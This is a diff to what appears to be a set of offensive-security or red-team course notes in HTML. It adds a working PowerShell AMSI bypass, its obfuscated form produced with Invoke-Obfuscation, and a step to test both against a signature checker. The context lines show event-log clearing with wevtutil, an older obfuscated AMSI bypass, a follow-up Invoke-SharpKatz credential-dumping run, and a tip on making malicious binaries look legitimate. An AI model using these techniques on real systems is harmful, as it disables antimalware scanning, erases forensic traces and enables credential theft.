@@ -974,7 +974,22 @@ Get-MpThreat
 <p>Let's clear the powershell event logs again:</p>
 <pre><code class="language-powershell">wevtutil cl &quot;Microsoft-Windows-PowerShell/Operational&quot;
 </code></pre>
+<p><code>NEW ONE</code>:</p>
+<pre><code class="language-powershell">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+</code></pre>
+<blockquote>
+<p>Invoke-obfuscation
+set scriptblock [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+token
+string
+2</p>
+</blockquote>
+<p>output =</p>
+<pre><code class="language-powershell">[Ref].Assembly.GetType((&quot;{6}{4}{10}{3}{5}{7}{0}{11}{2}{1}{8}{9}&quot;-f'.Auto','U','.Amsi','g','tem.','eme','Sys','nt','ti','ls','Mana','mation')).GetField((&quot;{0}{1}{2}&quot; -f 'amsi','InitFa','iled'),(&quot;{1}{0}{4}{2}{3}&quot; -f'c','NonPubli','t','ic',',Sta')).SetValue($null,$true)
+</code></pre>
+<p>Safe both commands to a file and run gocheck64</p>
 <p>And now let's run an obfuscated AMSI Bypass from the same powershell terminal:</p>
+<p><code>OLD ONE</code></p>
 <pre><code class="language-powershell">sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  &quot;{1}{0}&quot;-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( &quot;1Q2U&quot;  +&quot;zX&quot;  )  -VaL ).&quot;A`ss`Embly&quot;.&quot;GET`TY`Pe&quot;((  &quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) ).&quot;g`etf`iElD&quot;(  ( &quot;{0}{2}{1}&quot; -f'amsi','d','InitFaile'  ),(  &quot;{2}{4}{0}{1}{3}&quot; -f 'Stat','i','NonPubli','c','c, ' )).&quot;sE`T`VaLUE&quot;(  ${n`ULl},${t`RuE} )
 </code></pre>
 <p>And let's try that Invoke-SharpKatz again, if all goes well, AMSI should be patched and the script will run:</p>
@@ -1479,7 +1494,7 @@ ClamAV
 </code></pre>
 <p>Shelcode formats (shellcode formatter etc)</p>
 <blockquote>
-<p>OPSEC HINT: Make sure your binaries loog legit, add metadata and and icon to the file!</p>
+<p>OPSEC HINT: Make sure your binaries look legit, add metadata and and icon to the file!</p>
 </blockquote>
 <p>On Windows (requires SDK):
 <a href="https://dotnet.microsoft.com/en-us/">https://dotnet.microsoft.com/en-us/</a></p>
